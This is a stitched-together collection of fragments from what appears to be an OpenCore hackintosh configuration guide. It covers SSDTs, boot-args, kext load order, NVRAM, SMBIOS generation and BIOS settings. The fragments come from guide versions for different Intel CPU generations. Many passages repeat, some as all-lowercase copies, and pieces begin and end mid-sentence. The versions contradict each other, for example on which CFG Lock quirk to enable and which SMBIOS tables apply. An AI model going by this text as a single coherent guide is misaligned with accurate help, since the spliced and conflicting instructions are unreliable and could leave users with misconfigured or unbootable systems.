setup correctly)\n * Intel SGX\n * Intel Platform Trust\n * CFG Lock (MSR 0xE2 write protection)(This must be off, if you can't find the option then enable AppleXcpmCfgLock under Kernel -> Quirks.

everything, you won't be left in the cold. this also means if you have issues, review your config settings to make sure they're correct. main things to note with opencore:\n\n * all properties must be defined, there are no default opencore will fall back on so do not delete sections unless told explicitly so. if the guide doesn't mention the option, leave it at default.\n * the sample.plist cannot be used as-is, you must configure it to your system\n * do not use configurators, these rarely respect opencore's configuration and even some like mackie's will add clover properties and corrupt

support in macos\n\nwe also add 3 more properties, framebuffer-patch-enable, framebuffer-stolenmem and framebuffer-fbmem. the first enables patching via whatevergreen.kext, the second sets the min stolen memory to 19mb and third sets the framebuffer memory to 9mb. this is usually unnecessary, as this can be configured in bios(64mb recommended) but required when not available.\n\n * note: headless framebuffers(where the dgpu is the display out) do not need framebuffer-patch-enable, framebuffer-stolenmem and framebuffer-fbmem\n\nkey                        type

booting(ie. 10.4-10.6), for majority you can skip however for those planning to boot legacy oses you can see below:\n\nmore in-depth info\n\n * fuzzymatch: true\n   \n   * used for ignoring checksums with kernelcache, instead opting for the latest cache available. can help improve boot performance on many machines in 10.6\n\n * kernelarch: x86_64\n   \n   * set the kernel's arch type, you can choose between auto, i386 (32-bit), and x86_64 (64-bit).\n   * if you're booting older oses which require a 32-bit kernel(ie. 10.4 and 10.5) we recommend to set this to auto and let macos decide based on your smbios. see below table for supported values:\n     * 10.4-10.5 — x86_64, i386 or i386-user32\n       * i386-user32 refers 32-bit userspace, so 32-bit cpus must use this(or cpus missing ssse3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     * 10.8 or newer — x86_64\n\n * kernelcache: auto\n   \n   * set kernel cache type, mainly useful for debugging and so we recommend auto for best support\n\n\n# misc\n\n\n\n\n# boot\n\ninfo\n\nquirk

verbose mode, which shows all the\n              behind-the-scenes text that scrolls by as you're booting\n              instead of the apple logo and progress bar. it's invaluable\n              to any hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   this disables macos's watchdog which helps prevents a reboot\n              on a kernel panic. that way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    this is a companion setting to debug=0x100 that tells the os\n              to also print the symbols on a kernel panic. that can give\n              some more helpful insight as to what's causing the panic\n              itself.\nalcid=1       used for setting layout-id for applealc, see supported\n              codecs to figure out which layout to use for your specific\n

checks on some navi gpus (rx\n                 5000 & 6000 series), without this you'll get a black screen.\n                 don't use if you don't have navi (ie. polaris and vega cards\n                 shouldn't use this)\n-radcodec        used for allowing officially unsupported amd gpus (spoofed)\n                 to use the hardware video encoder\nradpg=15         used for disabling some power-gating modes, helpful for\n                 properly initializing amd cape verde based gpus\nunfairgva=1      used for fixing hardware drm support on supported amd gpus\nnvda_drv_vrl=1   used

protection' (sip). it is generally recommended to change this with csrutil via the recovery partition.\n   * csr-active-config by default is set to 00000000 which enables system integrity protection. you can choose a number of different values but overall we recommend keeping this enabled for best security practices. more info can be found in our troubleshooting page: disabling sip\n\n * run-efi-updater: no\n   \n   * this is used to prevent apple's firmware update packages from installing and breaking boot order; this is important as these firmware updates (meant for macs) will not work.\n\n * prev-lang:kbd: <>\n   \n   * needed for non-latin keyboards in the format of lang-country:keyboard, recommended to keep blank though you can specify it(default in sample config is russian):\n   * american: en-us:0(656e2d55533a30 in hex)\n   * full list can be found in applekeyboardlayouts.txt\n   * hint: prev-lang:kbd can be changed into a string so you can input en-us:0 directly instead of converting to hex\n   * hint 2: prev-lang:kbd can be set to a blank variable (eg. <>) which will force the language picker to appear instead at first boot up.\n\nkey             type     value\nprev-lang:kbd   string   en-us:0\n\n\n# delete\n\ninfo\n\nforcibly rewrites nvram variables, do note that add will not overwrite values already present in nvram so values like

platforminfo\n\n\n\ninfo\n\nfor setting up the smbios info, we'll use corpnewt's gensmbios application.\n\nfor this haswell example, we chose the imac15,1 smbios. the typical breakdown is as follows:\n\nsmbios     hardware\nimac14,4   haswell with only igpu\nimac15,1   haswell with dgpu\nimac16,2   broadwell\n\nnote: the following smbios are only supported up-to macos 11, big sur. for cases where you must boot monterey, see below:\n\nmonterey smbios table\n\nnote choosing a smbios from the list below for big sur or older is not recommended, as power management and such can break when using unoptimized smbios.\n\nmonterey table:\n\nsmbios     hardware\nimac16,2   broadwell with only igpu\nimac17,1   broadwell with dgpu\n\nnote 2: all of these smbioses were dropped in macos ventura. if running macos ventura, use a kaby lake smbios.\n\nrun gensmbios, pick option 1 for downloading macserial and option 3 for selecting out smbios. this will give us an output similar to the following:\n\n  #######################################################\n #               imac15,1 smbios info                  #\n#######################################################\n\ntype:

For Ventura information, see macOS 13 Ventura\nNote 2                  Ivy Bridge iGPUs are only supported up-to macOS 11\n\n\n# Starting Point\n\nSo making a config.plist may seem hard, it's not. It just takes some time but this guide will tell you how to configure everything, you won't be left in the cold. This also means if you have issues, review your config settings to make sure they're correct. Main things to note with OpenCore:\n\n * All properties must be defined, there are no default OpenCore will fall back on so do not delete sections unless told explicitly so. If the guide doesn't mention the option, leave it at default.\n * The Sample.plist cannot be used As-Is, you must configure it to your system\n * DO NOT USE CONFIGURATORS, these rarely respect OpenCore's configuration and even some like Mackie's will add Clover properties and corrupt plists!\n\nNow with all that, a quick reminder of the tools we need\n\n * ProperTree\n   * Universal plist editor\n * GenSMBIOS\n   * For generating our SMBIOS data\n * Sample/config.plist\n   * See previous section on how to obtain: config.plist Setup\n\nWARNING\n\nRead this guide more than once before setting up OpenCore and make sure you have it set up correctly. Do note that images will not always be the most up-to-date so please read the text below them, if nothing's mentioned then leave as default.\n\n\n# ACPI\n\n\n\n\n# Add\n\nInfo\n\nThis is where you'll add SSDTs for your system, these are very important to booting macOS and have many uses like USB maps, disabling unsupported GPUs and such. And with our system, it's even required to boot. Guide on making them found here: Getting started with ACPI\n\nFor us we'll need a couple of SSDTs to bring back functionality that Clover provided:\n\nREQUIRED SSDTS   DESCRIPTION\nSSDT-PM          Needed for proper CPU power management, you will need to run\n                 Pike's ssdtPRGen.sh script to generate this file. This will\n                 be run in post install.\nSSDT-EC          Fixes the embedded controller, see Getting Started With ACPI\n                 Guide for more details.\nSSDT-IMEI        Needed to add a missing IMEI device on Ivy Bridge CPU with 6\n                 series motherboards\n\nNote that you should not add your generated DSDT.aml here, it is already in your firmware. So if present, remove the entry for it in your config.plist and under EFI/OC/ACPI.\n\nFor those wanting a deeper dive into dumping your DSDT, how to make these SSDTs, and compiling them, please see the Getting started with ACPI page. Compiled SSDTs have a .aml extension(Assembled) and will go into the EFI/OC/ACPI folder and must be specified in your config under ACPI -> Add as well.\n\n\n# Delete\n\nInfo\n\nThis blocks certain ACPI tables from loading, for us we really care about this. Main reason is that Apple's XCPM does not support IvyBridge all too well and can cause AppleIntelCPUPowerManagement panics on boot. To avoid this we make our own PM SSDT in Post-Install and drop the old tables(Note that this is only temporary until we've made our SSDT-PM, we'll re-enable these tables later):\n\nRemoving CpuPm:\n\nKEY              TYPE      VALUE\nAll              Boolean   YES\nComment          String    Delete CpuPm\nEnabled          Boolean   YES\nOemTableId       Data      437075506d000000\nTableLength      Number    0\nTableSignature   Data      53534454\n\nRemoving Cpu0Ist:\n\nKEY              TYPE      VALUE\nAll              Boolean   YES\nComment          String    Delete Cpu0Ist\nEnabled          Boolean   YES\nOemTableId       Data      4370753049737400\nTableLength      Number    0\nTableSignature   Data      53534454\n\n\n# Patch\n\nThis section allows us to dynamically modify parts of the ACPI (DSDT, SSDT, etc.) via OpenCore. For us, our patches are handled by our SSDTs. This is a much cleaner solution as this will allow us to boot Windows and other OSes with OpenCore\n\n\n# Quirks\n\nSettings relating to ACPI, leave everything here as default as we have no use for these quirks.\n\n\n# Booter\n\n\n\nThis section is dedicated to quirks relating to boot.efi patching with OpenRuntime, the replacement for AptioMemoryFix.efi\n\n\n# MmioWhitelist\n\nThis section is allowing spaces to be passthrough to macOS that are generally ignored, useful when paired with DevirtualiseMmio\n\n\n# Quirks\n\nInfo\n\nSettings relating to boot.efi patching and firmware fixes, for us, we leave it as default\n\nMore in-depth Info\n * AvoidRuntimeDefrag: YES\n   * Fixes UEFI runtime services like date, time, NVRAM, power control, etc.\n * EnableSafeModeSlide: YES\n   * Enables slide variables to be used in safe mode, however this quirk is only applicable to UEFI platforms.\n * EnableWriteUnprotector: YES\n   * Needed to remove write protection from CR0 register.\n * ProvideCustomSlide: YES\n   * Used for Slide variable calculation. However the necessity of this quirk is determined by OCABC: Only N/256 slide values are usable! message in the debug log. If the message OCABC: All slides are usable! You can disable ProvideCustomSlide! is present in your log, you can disable ProvideCustomSlide.\n * SetupVirtualMap: YES\n   * Fixes SetVirtualAddresses calls to virtual addresses, required for Gigabyte boards to resolve early kernel panics.\n\n\n# DeviceProperties\n\n\n\n\n# Add\n\nSets device properties from a map.\n\nPciRoot(0x0)/Pci(0x2,0x0)\n\nThis section is set up via WhateverGreen's Framebuffer Patching Guide and is used for setting important iGPU properties.\n\nThe config.plist doesn't already have a section for this so you will have to create it manually.\n\nThe AAPL,ig-platform-id we use is as follows:\n\nAAPL,IG-PLATFORM-ID   COMMENT\n0A006601              Used when the iGPU is used to drive a display\n07006201              Used when the iGPU is only used for computing tasks and\n                      doesn't drive a display\n\nExample setup:\n\nKEY                   TYPE   VALUE\nAAPL,ig-platform-id   Data   0A006601\n\n(This is an example for a desktop HD 4000 without a dGPU)\n\nPciRoot(0x0)/Pci(0x16,0x0)\n\nThis is needed if you're pairing an Ivy Bridge CPU with a 6 series motherboard(ie. H61, B65, Q65, P67, H67, Q67, Z68), specifically needed to spoof your IMEI device into being supported. Note this property is still required with or without SSDT-IMEI.\n\nKEY         TYPE   VALUE\ndevice-id   Data   3A1E0000\n\nNote: This is not needed if you have a 7 series motherboard(ie. B75, Q75, Z75, H77, Q77, Z77)\n\nPciRoot(0x0)/Pci(0x1b,0x0)\n\nlayout-id\n\n * Applies AppleALC audio injection, you'll need to do your own research on which codec your motherboard has and match it with AppleALC's layout. AppleALC Supported Codecs.\n * You can delete this property outright as it's unused for us at this time\n\nFor us, we'll be using the boot-arg alcid=xxx instead to accomplish this. alcid will override all other layout-IDs present. More info on this is covered in the Post-Install Page\n\n\n# Delete\n\nRemoves device properties from the map, for us we can ignore this\n\n\n# Kernel\n\n\n\n\n# Add\n\nHere's where we specify which kexts to load, in what specific order to load, and what architectures each kext is meant for. By default we recommend leaving what ProperTree has done, however for 32-bit CPUs please see below:\n\nMore in-depth Info\n\nThe main thing you need to keep in mind is:\n\n * Load order\n   * Remember that any plugins should load after its dependencies\n   * This means kexts like Lilu must come before VirtualSMC, AppleALC, WhateverGreen, etc\n\nA reminder that ProperTree users can run Cmd/Ctrl + Shift + R to add all their kexts in the correct order without manually typing each kext out.\n\n * Arch\n   * Architectures supported by this kext\n   * Currently supported values are Any, i386 (32-bit), and x86_64 (64-bit)\n * BundlePath\n   * Name of the kext\n   * ex: Lilu.kext\n * Enabled\n   * Self-explanatory, either enables or disables the kext\n * ExecutablePath\n   * Path to the actual executable is hidden within the kext, you can see what path your kext has by right-clicking and selecting Show Package Contents. Generally, they'll be Contents/MacOS/Kext but some have kexts hidden within under Plugin folder. Do note that plist only kexts do not need this filled in.\n   * ex: Contents/MacOS/Lilu\n * MinKernel\n   * Lowest kernel version your kext will be injected into, see below table for possible values\n   * ex. 12.00.00 for OS X 10.8\n * MaxKernel\n   * Highest kernel version your kext will be injected into, see below table for possible values\n   * ex. 11.99.99 for OS X 10.7\n * PlistPath\n   * Path to the info.plist hidden within the kext\n   * ex: Contents/Info.plist\n\nKernel Support Table\n\nOS X VERSION   MINKERNEL   MAXKERNEL\n10.4           8.0.0       8.99.99\n10.5           9.0.0       9.99.99\n10.6           10.0.0      10.99.99\n10.7           11.0.0      11.99.99\n10.8           12.0.0      12.99.99\n10.9           13.0.0      13.99.99\n10.10          14.0.0      14.99.99\n10.11          15.0.0      15.99.99\n10.12          16.0.0      16.99.99\n10.13          17.0.0      17.99.99\n10.14          18.0.0      18.99.99\n10.15          19.0.0      19.99.99\n11             20.0.0      20.99.99\n12             21.0.0      21.99.99\n13             22.0.0      22.99.99\n\n\n# Emulate\n\nNeeded for spoofing unsupported CPUs like Pentiums and Celerons\n\n * Cpuid1Mask: Leave this blank\n * Cpuid1Data: Leave this blank\n\n\n# Force\n\nUsed for loading kexts off system volume, only relevant for older operating systems where certain kexts are not present in the cache(ie.

Please create a USB map when possible.\n   * With macOS 11.3+, XhciPortLimit may not function as intended. We recommend users either disable this quirk and map before upgrading or map from Windows. You may also install macOS 11.2.3 or older.\n\n\n# Scheme\n\nSettings related to legacy booting(ie. 10.4-10.6), for majority you can skip however for those planning to boot legacy OSes you can see below:\n\nMore in-depth Info\n\n * FuzzyMatch: True\n   \n   * Used for ignoring checksums with kernelcache, instead opting for the latest cache available. Can help improve boot performance on many machines in 10.6\n\n * KernelArch: x86_64\n   \n   * Set the kernel's arch type, you can choose between Auto, i386 (32-bit), and x86_64 (64-bit).\n   * If you're booting older OSes which require a 32-bit kernel(ie. 10.4 and 10.5) we recommend to set this to Auto and let macOS decide based on your SMBIOS. See below table for supported values:\n     * 10.4-10.5 — x86_64, i386 or i386-user32\n       * i386-user32 refers 32-bit userspace, so 32-bit CPUs must use this(or CPUs missing SSSE3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     * 10.8 or newer — x86_64\n\n * KernelCache: Auto\n   \n   * Set kernel cache type, mainly useful for debugging and so we recommend Auto for best support\n\n\n# Misc\n\n\n\n\n# Boot\n\nInfo\n\nQUIRK           ENABLED   COMMENT\nHideAuxiliary   YES       Press space to show macOS recovery and other auxiliary\n                          entries\n\nMore in-depth Info\n * HideAuxiliary: YES\n   * This option will hide supplementary entries, such as macOS recovery and tools, in the picker.

Can be considered a security risk so optional\n\n * BlacklistAppleUpdate: YES\n   \n   * Used for blocking firmware updates, used as extra level of protection as macOS Big Sur no longer uses run-efi-updater variable\n\n * DmgLoading: Signed\n   \n   * Ensures only signed DMGs load\n\n * ExposeSensitiveData: 6\n   \n   * Shows more debug information, requires debug version of OpenCore\n\n * Vault: Optional\n   \n   * We won't be dealing vaulting so we can ignore, you won't boot with this set to Secure\n   * This is a word, it is not optional to omit this setting. You will regret it if you don't set it to Optional, note that it is case-sensitive\n\n * ScanPolicy: 0\n   \n   * 0 allows you to see all drives available, please refer to Security section for further details. Will not boot USB devices with this set to default\n\n * SecureBootModel: Default\n   \n   * Controls Apple's secure boot functionality in macOS, please refer to Security section for further details.\n   * Note: Users may find upgrading OpenCore on an already installed system can result in early boot failures. To resolve this, see here: Stuck on OCB: LoadImage failed - Security Violation\n\n\n# Serial\n\nUsed for serial debugging (Leave everything as default).\n\n\n# Tools\n\nUsed for running OC debugging tools like the shell, ProperTree's snapshot function will add these for you.\n\n\n# Entries\n\nUsed for specifying irregular boot paths that can't be found naturally with OpenCore.\n\nWon't be covered here, see 8.6 of Configuration.pdf for more info\n\n\n# NVRAM\n\n\n\n\n# Add\n\n4D1EDE05-38C7-4A6A-9CC6-4BCCA8B38C14\n\nUsed for OpenCore's UI scaling, default will work for us.

It's invaluable\n              to any Hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   This disables macOS's watchdog which helps prevents a reboot\n              on a kernel panic. That way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    This is a companion setting to debug=0x100 that tells the OS\n              to also print the symbols on a kernel panic. That can give\n              some more helpful insight as to what's causing the panic\n              itself.\nalcid=1       Used for setting layout-id for AppleALC, see supported\n              codecs to figure out which layout to use for your specific\n              system. More info on this is covered in the Post-Install\n              Page\n\n * GPU-Specific boot-args:\n\nBOOT-ARGS        DESCRIPTION\nagdpmod=pikera   Used for disabling board ID checks on some Navi GPUs (RX\n                 5000 & 6000 series), without this you'll get a black screen.\n                 Don't use if you don't have Navi (ie. Polaris and Vega cards\n                 shouldn't use this)\n-radcodec        Used for allowing officially unsupported AMD GPUs (spoofed)\n                 to use the Hardware Video Encoder\nradpg=15         Used for disabling some power-gating modes, helpful for\n                 properly initializing AMD Cape Verde based GPUs\nunfairgva=1      Used for fixing hardware DRM support on supported AMD GPUs\nnvda_drv_vrl=1   Used for enabling NVIDIA's Web Drivers on Maxwell and Pascal\n                 cards in macOS Sierra and High Sierra\n-wegnoegpu       Used for disabling all other GPUs than the integrated Intel\n                 iGPU, useful for those wanting to run newer versions of\n                 macOS where their dGPU isn't supported\n\n * csr-active-config: 00000000\n   \n   * Settings for 'System Integrity Protection' (SIP). It is generally recommended to change this with csrutil via the recovery partition.\n   * csr-active-config by default is set to 00000000 which enables System Integrity Protection. You can choose a number of different values but overall we recommend keeping this enabled for best security practices. More info can be found in our troubleshooting page: Disabling SIP\n\n * run-efi-updater: No\n   \n   * This is used to prevent Apple's firmware update packages from installing and breaking boot order; this is important as these firmware updates (meant for Macs) will not work.\n\n * prev-lang:kbd: <>\n   \n   * Needed for non-latin keyboards in the format of lang-COUNTRY:keyboard, recommended to keep blank though you can specify it(Default in Sample config is Russian):\n   * American: en-US:0(656e2d55533a30 in HEX)\n   * Full list can be found in AppleKeyboardLayouts.txt\n   * Hint: prev-lang:kbd can be changed into a String so you can input en-US:0 directly instead of converting to HEX\n   * Hint 2: prev-lang:kbd can be set to a blank variable (eg. <>) which will force the Language Picker to appear instead at first boot up.\n\nKEY             TYPE     VALUE\nprev-lang:kbd   String   en-US:0\n\n\n# Delete\n\nInfo\n\nForcibly rewrites NVRAM variables, do note that Add will not overwrite values already present in NVRAM so values like boot-args should be left alone.

Only needed for systems without native NVRAM\n\n * WriteFlash: YES\n   \n   * Enables writing to flash memory for all added variables.\n\n\n# PlatformInfo\n\n\n\nInfo\n\nFor setting up the SMBIOS info, we'll use CorpNewt's GenSMBIOS application.\n\nFor this Ivy Bridge example, we'll chose the iMac13,2 SMBIOS - this is done intentionally for compatibility's sake. There are 3 main SMBIOS used for Ivy Bridge:\n\nSMBIOS     HARDWARE\niMac13,1   Used for computers utilizing the iGPU for displaying\niMac13,2   Used for computers using a dGPU for displaying, and an iGPU\n           for computing tasks only\n\nNote: The following SMBIOS are only supported up-to and including macOS 10.15, Catalina. For cases where you must boot Big Sur or Monterey, see below:\n\nBig Sur/Monterey SMBIOS table\n\nNote choosing a SMBIOS from the list below for Catalina or older is not recommended, as Power Management and such can break when using unoptimized SMBIOS.\n\nBig Sur table:\n\nSMBIOS     HARDWARE\niMac14,4   Used for computers utilizing the iGPU for displaying\niMac15,1   Used for computers using a dGPU for displaying, and an iGPU\n           for computing tasks only\n\nMonterey table:\n\nSMBIOS      HARDWARE\nMacPro6,1   As Monterey does not include iGPU drivers, you will want to\n            use MacPro6,1 and a supported dGPU\n\nRun GenSMBIOS, pick option 1 for downloading MacSerial and Option 3 for selecting out SMBIOS. This will give us an output similar to the following:\n\n  #######################################################\n #               iMac13,2 SMBIOS Info                  #\n#######################################################\n\nType:         iMac13,2\nSerial:       C02KCYZLDNCW\nBoard Serial: C02309301QXF2FRJC\nSmUUID:       A154B586-874B-4E57-A1FF-9D6E503E4580\n\n\nThe Type part gets copied to Generic -> SystemProductName.\n\nThe Serial part gets copied to Generic -> SystemSerialNumber.\n\nThe Board Serial part gets copied to Generic -> MLB.\n\nThe SmUUID part gets copied to Generic -> SystemUUID.\n\nWe set Generic -> ROM to either an Apple ROM (dumped from a real Mac), your NIC MAC address, or any random MAC address (could be just 6 random bytes, for this guide we'll use 11223300 0000. After install follow the Fixing iServices page on how to find your real MAC Address)\n\nReminder that you need an invalid serial! When inputting your serial number in Apple's Check Coverage Page, you should get a message such as \"Unable to check coverage for this serial number.\"\n\nAutomatic: YES\n\n * Generates PlatformInfo based on Generic section instead of DataHub, NVRAM, and SMBIOS sections\n\n:::\n\n\n# Generic\n\nMore in-depth Info\n\n * AdviseFeatures: NO\n   \n   * Used for when the EFI partition isn't first on the Windows drive\n\n * MaxBIOSVersion: NO\n   \n   * Sets BIOS version to Max to avoid firmware updates in Big Sur+, mainly applicable for genuine Macs.\n\n * ProcessorType: 0\n   \n   * Set to 0 for automatic type detection, however this value can be overridden if desired. See AppleSmBios.h for possible values\n\n * SpoofVendor: YES\n   \n   * Swaps vendor field for Acidanthera, generally not safe to use Apple as a vendor in most case\n\n * SystemMemoryStatus: Auto\n   \n   * Sets whether memory is soldered or not in SMBIOS info, purely cosmetic and so we recommend Auto\n\n * UpdateDataHub: YES\n   \n   * Update Data Hub fields\n\n * UpdateNVRAM: YES\n   \n   * Update NVRAM fields\n\n * UpdateSMBIOS: YES\n   \n   * Updates SMBIOS fields\n\n * UpdateSMBIOSMode: Create\n   \n   * Replace the tables with newly allocated EfiReservedMemoryType, use Custom on Dell laptops requiring CustomSMBIOSGuid quirk\n   * Setting to Custom with CustomSMBIOSGuid quirk enabled can also disable SMBIOS injection into \"non-Apple\" OSes however we do not endorse this method as it breaks Bootcamp compatibility. Use at your own risk\n\n\n# UEFI\n\n\n\nConnectDrivers: YES\n\n * Forces .efi drivers, change to NO will automatically connect added UEFI drivers. This can make booting slightly faster, but not all drivers connect themselves. E.g. certain file system drivers may not load.\n\n\n# Drivers\n\nAdd your .efi drivers here.\n\nOnly drivers present here should be:\n\n * HfsPlus.efi\n * OpenRuntime.efi\n\nMore in-depth Info\n\nKEY         TYPE      DESCRIPTION\nPath        String    Path of the file from OC/Drivers directory\nLoadEarly   Boolean   Load the driver early before NVRAM setup, should only be\n                      enabled for OpenRuntime.efi and OpenVariableRuntimeDxe.efi\n                      if using legacy NVRAM\nArguments   String    Some drivers accept additional arguments which are specified\n                      here.\n\n\n# APFS\n\nBy default, OpenCore only loads APFS drivers from macOS Big Sur and newer. If you are booting macOS Catalina or earlier, you may need to set a new minimum version/date. Not setting this can result in OpenCore not finding your macOS partition!\n\nmacOS Sierra and earlier use HFS instead of APFS. You can skip this section if booting older versions of macOS.\n\nAPFS Versions\n\nBoth MinVersion and MinDate need to be set if changing the minimum version.\n\nMACOS VERSION           MIN VERSION        MIN DATE\nHigh Sierra (10.13.6)   748077008000000    20180621\nMojave (10.14.6)        945275007000000    20190820\nCatalina (10.15.4)      1412101001000000   20200306\nNo restriction          -1                 -1\n\n\n# Audio\n\nRelated to AudioDxe settings, for us we'll be ignoring(leave as default). This is unrelated to audio support in macOS.\n\n * For further use of AudioDxe and the Audio section, please see the Post Install page: Add GUI and Boot-chime\n\n\n# Input\n\nRelated to boot.efi keyboard passthrough used for FileVault and Hotkey support, leave everything here as default as we have no use for these quirks.

See here for more details: Security and FileVault\n\n\n# Quirks\n\nInfo\n\nRelating to quirks with the UEFI environment, for us we'll be changing the following:\n\nQUIRK                    ENABLED   COMMENT\nIgnoreInvalidFlexRatio   YES       \nUnblockFsConnect         NO        Needed mainly by HP motherboards\n\nMore in-depth Info\n\n * IgnoreInvalidFlexRatio: YES\n   \n   * Fix for when MSR_FLEX_RATIO (0x194) can't be disabled in the BIOS, required for all pre-Skylake based systems\n\n * DisableSecurityPolicy: NO\n   \n   * Disables platform security policy in firmware, recommended for buggy firmwares where disabling Secure Boot does not allow 3rd party firmware drivers to load.\n   * If running a Microsoft Surface device, recommended to enable this option\n\n * RequestBootVarRouting: YES\n   \n   * Redirects AptioMemoryFix from EFI_GLOBAL_VARIABLE_GUID to OC_VENDOR_VARIABLE_GUID. Needed for when firmware tries to delete boot entries and is recommended to be enabled on all systems for correct update installation, Startup Disk control panel functioning, etc.\n\n * UnblockFsConnect: NO\n   \n   * Some firmware block partition handles by opening them in By Driver mode, which results in File System protocols being unable to install. Mainly relevant for HP systems when no drives are listed\n\n\n# ReservedMemory\n\nUsed for exempting certain memory regions from OSes to use, mainly relevant for Sandy Bridge iGPUs or systems with faulty memory. Use of this quirk is not covered in this guide\n\n\n# Cleaning up\n\nAnd now you're ready to save and place it into your EFI under EFI/OC.\n\nFor those having booting issues, please make sure to read the Troubleshooting section first and if your questions are still unanswered we have plenty of resources at your disposal:\n\n * r/Hackintosh Subreddit\n * r/Hackintosh Discord\n\n\n# Intel BIOS settings\n\n * Note: Most of these options may not be present in your firmware, we recommend matching up as closely as possible but don't be too concerned if many of these options are not available in your BIOS\n\n\n# Disable\n\n * Fast Boot\n * Secure Boot\n * Serial/COM Port\n * Parallel Port\n * VT-d (can be enabled if you set DisableIoMapper to YES)\n * Compatibility Support Module (CSM) (Must be off in most cases, GPU errors/stalls like gIO are common when this option is enabled)\n * Thunderbolt (For initial install, as Thunderbolt can cause issues if not setup correctly)\n * Intel SGX\n * Intel Platform Trust\n * CFG Lock (MSR 0xE2 write protection)(This must be off, if you can't find the option then enable AppleCpuPmCfgLock under Kernel -> Quirks.

hard, it's not. it just takes some time but this guide will tell you how to configure everything, you won't be left in the cold. this also means if you have issues, review your config settings to make sure they're correct. main things to note with opencore:\n\n * all properties must be defined, there are no default opencore will fall back on so do not delete sections unless told explicitly so. if the guide doesn't mention the option, leave it at default.\n * the sample.plist cannot be used as-is, you must configure it to your system\n * do not use configurators, these rarely respect opencore's configuration and even some like mackie's will add clover properties and corrupt plists!\n\nnow with all that, a quick reminder of the tools we need\n\n * propertree\n   * universal plist editor\n * gensmbios\n   * for generating our smbios data\n * sample/config.plist\n   * see previous section on how to obtain: config.plist setup\n\nwarning\n\nread this guide more than once before setting up

acpi\n\n\n\n\n# add\n\ninfo\n\nthis is where you'll add ssdts for your system, these are very important to booting macos and have many uses like usb maps, disabling unsupported gpus and such. and with our system, it's even required to boot. guide on making them found here: getting started with acpi\n\nfor us we'll need a couple of ssdts to bring back functionality that clover provided:\n\nrequired ssdts   description\nssdt-pm          needed for proper cpu power management, you will need to run\n                 pike's ssdtprgen.sh script to generate this file. this will\n                 be

config.plist and under efi/oc/acpi.\n\nfor those wanting a deeper dive into dumping your dsdt, how to make these ssdts, and compiling them, please see the getting started with acpi page. compiled ssdts have a .aml extension(assembled) and will go into the efi/oc/acpi folder and must be specified in your config under acpi -> add as well.\n\n\n# delete\n\ninfo\n\nthis blocks certain acpi tables from loading, for us we really care about this. main reason is that apple's xcpm does not support ivybridge all too well and can cause appleintelcpupowermanagement panics on boot. to avoid this we make our own pm ssdt in post-install and drop the old tables(note that this is only temporary until we've made our ssdt-pm, we'll re-enable these tables later):\n\nremoving cpupm:\n\nkey

recommend to set this to auto and let macos decide based on your smbios. see below table for supported values:\n     * 10.4-10.5 — x86_64, i386 or i386-user32\n       * i386-user32 refers 32-bit userspace, so 32-bit cpus must use this(or cpus missing ssse3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     * 10.8 or newer — x86_64\n\n * kernelcache: auto\n   \n   * set kernel cache type, mainly useful for debugging and so we recommend auto for best

hard, it's not. It just takes some time but this guide will tell you how to configure everything, you won't be left in the cold. This also means if you have issues, review your config settings to make sure they're correct. Main things to note with OpenCore:\n\n * All properties must be defined, there are no default OpenCore will fall back on so do not delete sections unless told explicitly so. If the guide doesn't mention the option, leave it at default.\n * The Sample.plist cannot be used As-Is, you must configure it to your system\n * DO NOT USE CONFIGURATORS, these rarely respect OpenCore's configuration and even some like Mackie's will add Clover properties and corrupt plists!\n\nNow with all that, a quick reminder of the tools we need\n\n * ProperTree\n   * Universal plist editor\n * GenSMBIOS\n   * For generating our SMBIOS data\n * Sample/config.plist\n   * See previous section on how to obtain: config.plist Setup\n\nWARNING\n\nRead this guide more than once before setting up OpenCore and make sure you have it set up correctly. Do note that images will not always be the most up-to-date so please read the text below them, if nothing's mentioned then leave as default.\n\n\n# ACPI\n\n\n\n\n# Add\n\nInfo\n\nThis is where you'll add SSDTs for your system, these are very important to booting macOS and have many uses like USB maps, disabling unsupported GPUs and such. And with our system, it's even required to boot. Guide on making them found here: Getting started with ACPI\n\nFor us we'll need a couple of SSDTs to bring back functionality that Clover provided:\n\nREQUIRED SSDTS   DESCRIPTION\nSSDT-PLUG        Allows for native CPU power management on Haswell and newer,\n                 see Getting Started With ACPI Guide for more details.\nSSDT-EC-USBX     Fixes both the embedded controller and USB power, see\n                 Getting Started With ACPI Guide for more details.\nSSDT-AWAC        This is the 300 series RTC patch, required for all B460 and\n                 Z490 boards which prevent systems from booting macOS. The\n                 alternative is SSDT-RTC0 for when AWAC SSDT is incompatible\n                 due to missing the Legacy RTC clock, to check whether you\n                 need it and which to use please see Getting started with\n                 ACPI page.\nSSDT-RHUB        Needed to fix Root-device errors on Asus and potentially MSI\n                 boards. Gigabyte and AsRock motherboards do not need this\n                 SSDT\n\nNote that you should not add your generated DSDT.aml here, it is already in your firmware. So if present, remove the entry for it in your config.plist and under EFI/OC/ACPI.\n\nFor those wanting a deeper dive into dumping your DSDT, how to make these SSDTs, and compiling them, please see the Getting started with ACPI page. Compiled SSDTs have a .aml extension(Assembled) and will go into the EFI/OC/ACPI folder and must be specified in your config under ACPI -> Add as well.\n\n\n# Delete\n\nThis blocks certain ACPI tables from loading, for us we can ignore this.\n\n\n# Patch\n\nThis section allows us to dynamically modify parts of the ACPI (DSDT, SSDT, etc.) via OpenCore. For us, our patches are handled by our SSDTs. This is a much cleaner solution as this will allow us to boot Windows and other OSes with OpenCore\n\n\n# Quirks\n\nSettings relating to ACPI, leave everything here as default as we have no use for these quirks.\n\n\n# Booter\n\n\n\nThis section is dedicated to quirks relating to boot.efi patching with OpenRuntime, the replacement for AptioMemoryFix.efi\n\n\n# MmioWhitelist\n\nThis section is allowing devices to be 